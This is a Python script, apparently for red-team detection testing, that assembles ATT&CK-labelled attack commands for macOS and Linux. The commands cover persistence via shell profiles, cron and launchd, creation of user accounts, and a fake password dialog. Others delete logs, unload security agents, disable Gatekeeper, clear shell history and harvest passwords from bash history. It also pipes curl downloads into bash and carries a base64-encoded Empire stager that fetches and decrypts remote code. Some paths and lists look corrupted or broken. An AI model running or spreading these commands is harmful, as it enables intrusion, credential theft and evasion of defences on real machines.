import os, datetime
import logging
import sys


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cwd = os.getcwd()
evil_cmd = '''"python -c \"import os, base64; print os.popen(base64.b64decode('d2hvYW1pCmlmY29uZmlnCmxzIC1hbAo=')).read()\""'''

# PERSISTENCE

usernames = ['user1', 'user2', 'user3', 'user4', 'user5', 'user6']

T1136 = '''
dscl . -create /Users/''' + usernames[0] + '''
dscl . -create /Users/''' + usernames[1] + ''' UserShell /bin/bash
dscl . -create /Users/''' + usernames[2] + ''' RealName "T1136"
dscl . -create /Users/''' + usernames[3] + ''' UniqueID "1010"
dscl . -create /Users/''' + usernames[4] + ''' PrimaryGroupID 80
dscl . -create /Users/''' + usernames[5] + ''' NFSHomeDirectory /Users/''' + usernames[5]

T1150_value = '''
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.my-fancy-task</string>
    <key>OnDemand</key>
    <true/>
    <key>ProgramArguments</key>
    <array>
        <string>T1150-test1</string>
        <string>T1150-test2</string>
    </array>
    <key>StartInterval</key>
    <integer>1800</integer>
</dict>
</plist>
'''

value_1 = "/bin/sh"
value_2 = cwd + "/T1150.sh"
T1150_file = open('T1150', 'w')
T1150_file.write(T1150_value)
T1150_file.close()

T1150_1 = "sed 's/T1150-test1/\/bin\/sh/g' /tmp/T1150"
T1150_2 = "sed 's/T1150-test2/%s/g' /tmp/T1150" % value_2.replace('/', '\/')

T1152_app = '/Applications/Calculator.app/Contents/MacOS/Calculator'

T1152 = '''
launchctl submit -l evil -- ''' + T1152_app

T1154_url = 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1154/echo-art-fish.sh'

T1154 = '''
trap 'nohup curl -sS ''' + T1154_url + ''' | bash' EXIT
exit
trap 'nohup curl -sS ''' + T1154_url + ''' | bash' INT
'''

T1156 = '''
echo "''' + evil_cmd + '''" >> ~/.bash_profile
'''

T1159_osascript = 'tell app "Finder" to display dialogfile "Hello World"'

T1159 = '''
osascript -e "''' + T1159_osascript + '''"'''

T1164 = '''
sudo defaults write com.apple.logfileinwindow logfileinHook ''' + evil_cmd + '''
'''

T1165 = '''
sudo cp "1150" /etc/emond.d/rules/T1165_emond.plist
sudo touch /private/var/db/emondClients/T1165
'''

T1168 = '''
echo ''' + evil_cmd + ''' > /tmp/persistevil && crontab /tmp/persistevil
'''

# PRIVILEGE ESCALATION

T1141_osascript = '''tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialogfile "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'''

T1141 = '''
osascript -e "''' + T1141_osascript + '''"'''

c_file = '''
#include <stdio.h>
int main()
{
   printf("Hello, World!");
   return 0;
}
'''

makefile = '''
all: hello.c
	gcc -g -Wall -o hello hello.c
'''

T1166_c_file = open('hello.c', 'w')
T1166_c_file.write(c_file)
T1166_c_file.close()

T1166_makefile = open('makefile', 'w')
T1166_makefile.write(makefile)
T1166_makefile.close()

T1166 = '''
make hello
sudo chown root hello
sudo chmod u+s hello
./hello
'''

# DEFENSE EVASION

T1070 = '''
rm -rf /private/var/logfile/system.logfile*
rm -rf /private/var/audit/*
'''

T1089 = '''
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
'''

T1099 = '''
touch -a -t 197001010000.00 /tmp/T1089-1
touch -m -t 197001010000.00 /tmp/T1089-2
			
NOW=$(date)
date -s "1970-01-01 00:00:00"
touch 1089-3
date -s "$NOW"
stat 1089-3
'''

# TESTING DIFFERS BASED ON OS FLAVOR

T1130_ssl_dir = "/etc/ssl/certs/"

T1130 = '''
openssl req -subj '/CN=Temporary Cert/O=Temporary Cert/C=US' -new -newkey rsa:2048 -sha256 -days 365 -nodes -x509 -keyout T1130-key.pem -out T1130-cert.pem
cp T1130-cert.pem ''' + T1130_ssl_dir + '''
update-ca-certificates
'''

# DETERMINA APPPATH

T1144_app_path = ""

T1144 = '''
sudo xattr -r -d com.apple.quarantine ''' + T1144_app_path + '''
sudo spctl --master-disable
'''

T1148 = '''
export HISTCONTROL=ignoreboth
ls ''' + evil_cmd + '''
set +o history
history -c
set -o history
'''

T1151 = '''
echo '#!/bin/bash\necho "print "hello, world!"" | /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt
mv execute.txt "execute.txt "
./execute.txt\
'''

# CRED ACCESS

T1139 = '''
cat ~/.bash_history | grep 'pass\|ssh\|rdesktop' > /tmp/T1139.txt
'''

# DOWNLOAD CERTIFICATE
T1142 = '''
security -h
security find-certificate -a -p > allcerts.pem
security import T1130-cert.pem -k
'''

# LATERAL MOVEMENT

# REPLACE PAYLOAD WITH YOUR EMPIRE PAYLOAD

T1155_empire_agent = "do shell script \"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\" | python &\""
T1155_linux = "python -c \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc4Yzk0OThmYjg1YmQ1MTE5ZGQ5ODQ4MTJlZTVlOTg5OSc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSkK'));\" "

T1155 = '''
osascript ''' + T1155_empire_agent + '''
'''

# EXECUTION

T1059_url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh"

T1059 = '''
bash -c "curl -sS ''' + T1059_url + ''' | bash"
bash -c "wget --quiet -O - ''' + T1059_url + ''' | bash"
'''

# DATA EXFIL

T1002 = '''
mkdir /tmp/victim-files
cd /tmp/victim-files
touch a b c d e f g
echo "This file will be gzipped" > /tmp/victim-gzip.txt
echo "This file will be tarred" > /tmp/victim-tar.txt
zip /tmp/victim-files.zip /tmp/victim-files/*
gzip -f /tmp/victim-gzip.txt
tar -cvzf /tmp/victim-files.tar.gz /tmp/victim-files/
tar -cvzf /tmp/victim-tar.tar.gz
'''

T1022 = '''
echo "This file will be encrypted" > /tmp/victim-gpg.txt
mkdir /tmp/victim-files
cd /tmp/victim-files
touch a b c d e f g
zip --password "password" /tmp/victim-files.zip /tmp/victim-files/*
gpg -c /tmp/victim-gpg.txt
ls -l
'''

# FOR MAC 

TTP_NUMBERS_MAC = ["T1136", "T1150_1", "T1150_2", "T1152", "T1154", "T1156", "T1159", "T1164", "T1165", "T1168", "T1141",
               "T1166", "T1070", "T1089", "T1099", "T1144", "T1148", "T1151", "T1139", "T1142", "T1155", "T1059", "T1002", "T1022"]

TTP_LIST_MAC = [T1136, T1150_1, T1150_2, T1152, T1154, T1156, T1159, T1164, T1165, T1168, T1141, T1166, T1070, T1089, T1099,
            T1144, T1148, T1151, T1139, T1142, T1155]

for i in range(len(TTP_LIST_MAC)):
    print(datetime.datetime.now())
    print("")
    print(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
    print("")
    print(TTP_LIST_MAC[i])
    print("")
    # os.popen(TTP_LIST_MAC[i]).read() # UNCOMMENT THIS WHEN YOU PLAN TO EXECUTE THE TTPS
    print(
        "------------------------------------------------------------------------------------------------------------------------------------------------------")
    with open('log.txt', 'a') as log:
        log.write(str(datetime.datetime.now()))
        log.write("\n\n")
        log.write(bcolors.BOLD + bcolors.FAIL + "Executing " + bcolors.OKGREEN + TTP_NUMBERS_MAC[i] + bcolors.ENDC)
        log.write("\n")
        log.write(TTP_LIST_MAC[i])
        log.write("\n")
        log.write(
            "------------------------------------------------------------------------------------------------------------------------------------------------------\n\n")
    print("\n")

'''

For LINUX Use following List

TTP_NUMBERS_LINUX = ["T1154", "T1156", "T1168", "T1166", "T1099", "T1130", "T1148", "T1151", "T1139", "T1142", "T1139", "T1155", "T1059", "T1002", "T1022"]]

TTP_LIST_LINUX = [ T1154, T1156, T1159, T1168, T1166, T1099, T1130, T1148, T1151, T1139, T1142, T1139, T1155, T1059, T1002, T1022]

'''
